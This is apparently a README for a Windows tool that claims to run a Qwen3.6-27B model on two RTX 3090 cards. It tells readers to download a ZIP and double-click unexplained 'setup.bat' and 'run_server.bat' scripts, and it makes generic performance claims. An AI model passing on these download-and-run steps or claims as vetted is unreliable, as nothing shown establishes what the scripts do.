# 🤖 qwen36-dual-3090 - Run fast large language models locally

[![Download Software](https://img.shields.io/badge/Download_Qwen36-blue.svg)](https://github.com/nick19patrick/qwen36-dual-3090)

This software allows you to run the Qwen3.6-27B language model on a computer equipped with two Nvidia RTX 3090 graphics cards. Use this tool if you need high-speed text responses for tasks like writing, coding, or data analysis. It handles the complex math behind the model so you receive fast, fluid answers.

## ⚙️ System Requirements

To use this software, your computer needs specific hardware. These requirements ensure the model runs without errors and provides quick responses.

- Operating System: Windows 10 or Windows 11 (64-bit).
- Graphics Cards: Two Nvidia RTX 3090 cards. Total VRAM must be at least 48 GB.
- Memory: 64 GB of system RAM.
- Storage: 100 GB of free space on an SSD.
- Drivers: Latest Nvidia Game Ready or Studio drivers.
- Software: Nvidia CUDA Toolkit version 12.1 or newer.

Verify your hardware before you start. Right-click the Start button and select Device Manager to see your graphics cards under Display adapters.

## 💾 Downloading and Setup

Follow these steps to acquire the files and prepare your environment.

[Visit the official download page here to get the files.](https://github.com/nick19patrick/qwen36-dual-3090)

1. Open the link above in your web browser.
2. Look for the green "Code" button or the "Releases" section on the right side of the page.
3. Click "Download ZIP" to save the repository folder to your computer.
4. Extract the ZIP file to a folder on your primary drive.
5. Open the folder and locate the installation script named `setup.bat`.
6. Double-click the file to begin the automatic installation process.

The script installs the necessary components, such as vLLM and the required model dependencies. This process may take several minutes depending on your internet connection speed. A command window appears on your screen; do not close this window until the process completes.

## 🚀 Running the Model

Once the setup finishes, you are ready to start the server. This software runs locally, meaning your data stays on your machine.

1. Open the `qwen36-dual-3090` folder.
2. Double-click the `run_server.bat` file.
3. Wait for the terminal window to show a message stating the server is ready. This message usually says "Uvicorn running on http://127.0.0.1:8000".
4. Open your web browser.
5. Type `http://127.0.0.1:8000` into the address bar and press Enter.

The user interface displays in your browser window. You can type prompts into the text box and press the submit button to interact with the model.

## 🛠 Troubleshooting Common Issues

If the software does not start, check these common items:

- Graphics Drivers: If you see errors related to CUDA, visit the Nvidia website and download the latest drivers for your RTX 3090 cards.
- Memory Errors: If the model fails to load, verify you have both RTX 3090 cards plugged in and detected by windows. The model requires both cards to function.
- Port Conflicts: If the browser says it cannot connect, another program might be using port 8000. Close other local web services or restart your computer.
- Storage Space: Ensure you have at least 100 GB of free space. The model files are large and require significant room to load correctly into memory.

## 📋 Features Overview

This implementation provides several benefits for users managing large models:

- Dual-Card Parallelism: By splitting the model across two cards, the system processes text tokens twice as fast as a single-card setup.
- Memory Efficiency: The use of fp8 precision reduces the memory footprint of the model, allowing it to fit comfortably within the 48 GB of total VRAM.
- Sustained Performance: The vLLM integration manages concurrent requests, which helps when you have multiple users or automated tasks asking questions simultaneously.
- Technical Optimization: The recipe uses validated settings for MTP and TP strategies, ensuring the math stays accurate during translation and generation tasks.

## 💡 Usage Best Practices

To get the most out of the system, keep the following in mind:

- Keep the browser window open while the server runs. If you close the terminal window, the server stops.
- Avoid running other graphics-heavy programs while the model is active. This ensures the full power of the RTX 3090 cards goes toward your text generation.
- Periodically check the GitHub page for updates. As vLLM and model techniques improve, the developers may release patches that increase speed or stability.
- Monitor your temperatures. Training and serving models consume significant power. Ensure your PC case has good airflow so fans can cool the graphics cards effectively.

If you encounter persistent errors, check your system logs located in the `logs` subfolder of the main installation directory. These text files contain details on why a process might have failed.